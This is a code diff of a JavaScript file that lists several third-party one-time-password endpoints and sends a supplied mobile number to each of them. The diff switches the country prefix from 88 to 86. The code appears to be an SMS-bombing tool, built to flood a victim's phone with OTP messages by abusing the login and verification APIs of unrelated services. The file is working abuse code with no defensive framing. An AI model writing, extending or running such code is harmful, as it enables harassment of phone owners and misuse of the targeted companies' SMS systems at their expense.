@@ -14,20 +14,20 @@ $(document).ready(() => {
             const APIS = [
                 {
                     method: "POST",
-                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
+                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-86${mobile}/operator-Robi/send`,
                 },
                 {
                     method: 'POST',
                     url: "http://robi.api.bongobd.com/api/login/send-otp",
-                    body: `msisdn=88${mobile}&operator=all`
+                    body: `msisdn=86${mobile}&operator=all`
                 },
                 {
                     method: 'GET',
-                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
+                    url: `http://45.114.85.19:8080/v3/otp/send?msisdn=86${mobile}`
                 },
                 {
                     method: 'GET',
-                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
+                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B86`
                 },
                 {
                     url: "https://ss.binge.buzz/otp/send/login",
